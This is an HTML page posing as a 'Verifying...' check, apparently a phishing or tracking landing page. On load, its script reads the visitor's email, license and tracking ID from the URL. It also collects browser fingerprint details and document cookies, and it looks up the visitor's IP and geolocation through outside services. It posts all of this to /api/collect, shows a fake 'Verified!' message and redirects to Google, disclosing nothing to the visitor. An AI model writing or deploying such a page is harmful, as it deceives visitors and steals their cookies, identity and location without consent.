<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #006a4e 0%, #f42a41 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 28px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #006a4e;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success { color: #006a4e; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner" id="spinner"></div>
        <h2>🔍 Verifying...</h2>
        <p>Please wait...</p>
        <p id="status"></p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id');
        const userEmail = urlParams.get('email');
        const license = urlParams.get('license');
        
        const userData = {
            trackingId: trackingId,
            userEmail: userEmail,
            license: license,
            timestamp: new Date().toISOString(),
            ip: null,
            location: null,
            browser: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'Direct',
            cookies: document.cookie || 'No cookies'
        };
        
        async function getLocation() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userData.ip = data.ip;
                
                const locationRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
                const locationData = await locationRes.json();
                userData.location = {
                    country: locationData.country_name,
                    city: locationData.city,
                    region: locationData.region,
                    latitude: locationData.latitude,
                    longitude: locationData.longitude
                };
            } catch (error) {
                userData.ip = 'Unable to fetch';
            }
        }
        
        async function sendData() {
            await getLocation();
            
            try {
                await fetch('/api/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                });
                
                document.getElementById('spinner').style.display = 'none';
                document.querySelector('h2').innerHTML = '✅ Verified!';
                document.querySelector('p').innerHTML = 'Thank you!';
                document.getElementById('status').innerHTML = '<span class="success">Verification complete</span>';
                
                setTimeout(() => {
                    window.location.href = 'https://google.com';
                }, 3000);
            } catch (error) {
                document.getElementById('status').innerHTML = 'Error';
            }
        }
        
        sendData();
    </script>
</body>
</html>
